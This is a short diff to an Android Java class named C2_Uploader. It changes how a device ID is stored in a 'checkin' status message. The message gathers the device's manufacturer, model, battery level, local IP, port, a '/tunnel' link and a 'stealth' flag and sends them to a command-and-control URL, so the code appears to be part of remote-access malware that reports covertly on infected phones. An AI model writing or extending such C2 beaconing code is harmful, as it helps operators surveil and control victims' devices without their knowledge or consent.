@@ -44,8 +44,9 @@ public class C2_Uploader {
                 String ip = MainActivity.getLocalIpAddress();
                 int port = FirebaseConfig.DEFAULT_PORT;
                 
+                String devId = getDeviceId(context);
                 JSONObject status = new JSONObject();
-                status.put("deviceId", Build.MANUFACTURER);
+                status.put("deviceId", devId);
                 status.put("brand", Build.MANUFACTURER);
                 status.put("type", "checkin");
                 status.put("model", Build.MODEL);
@@ -53,7 +54,7 @@ public class C2_Uploader {
                 status.put("battery", SystemAnalytics.getBatteryLevel(context) + "%");
                 status.put("ip", ip);
                 status.put("port", port);
-                status.put("link", "/tunnel?deviceId=" + getDeviceId(context));
+                status.put("link", "/tunnel?deviceId=" + devId);
                 status.put("stealth", SystemAnalytics.isStealthEnabled(context));
                 
                 String baseC2 = c2Url.trim();
